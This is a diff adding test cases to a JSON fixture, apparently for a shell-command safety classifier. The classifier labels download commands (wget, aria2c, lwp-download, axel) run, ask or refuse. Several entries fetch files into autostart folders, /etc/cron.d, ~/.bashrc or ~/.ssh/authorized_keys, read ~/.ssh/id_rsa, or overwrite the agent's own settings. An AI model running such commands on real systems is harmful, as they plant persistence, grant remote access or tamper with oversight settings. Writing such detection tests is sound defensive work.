@@ -12193,6 +12193,238 @@
   {
    "cmd": "echo --file=~/.ssh/id_rsa",
    "verdict": "run"
+  },
+  {
+   "cmd": "wget -P ~/.config/autostart https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P ~/.config/autostart https://example.com/x.desktop",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P ~/.ssh https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "wget -P ~/.config/ember -N https://example.com/x",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "wget -P ~/.config/ember --backups=1 https://example.com/settings.json",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "wget --directory-prefix=~/.config/autostart https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget --directory-prefix ~/.config/autostart https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P ~ https://example.com/.bashrc",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.startup"
+   ]
+  },
+  {
+   "cmd": "wget -P /etc/cron.d https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P \"$D\" https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ],
+   "rules": [
+    "redirect.overwrite"
+   ]
+  },
+  {
+   "cmd": "wget -O \"$F\" https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ],
+   "rules": [
+    "redirect.overwrite"
+   ]
+  },
+  {
+   "cmd": "cd ~/.config/autostart && wget https://example.com/x.desktop",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P build https://example.com/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "wget -P build -r https://example.com/",
+   "verdict": "run"
+  },
+  {
+   "cmd": "wget https://example.com/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "aria2c -d ~/.config/autostart https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "aria2c --dir=~/.config/autostart https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "aria2c -d ~/.ssh -o authorized_keys https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "aria2c -d ~/.config/ember -o settings.json https://example.com/x",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "aria2c -i ~/.ssh/id_rsa",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "aria2c -d build https://example.com/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "aria2c -i urls.txt -d build",
+   "verdict": "run"
+  },
+  {
+   "cmd": "aria2c https://example.com/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "lwp-download https://example.com/x ~/.config/autostart/x.desktop",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "lwp-download https://example.com/x ~/.config/autostart",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "lwp-download https://example.com/settings.json ~/.config/ember",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "lwp-download https://example.com/.bashrc ~",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.startup"
+   ]
+  },
+  {
+   "cmd": "lwp-download https://example.com/x.tar.gz build/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "lwp-download https://example.com/x.tar.gz",
+   "verdict": "run"
+  },
+  {
+   "cmd": "axel --output=~/.config/autostart/x.desktop https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "axel -o build/x.tar.gz https://example.com/x.tar.gz",
+   "verdict": "run"
   }
  ]
 }
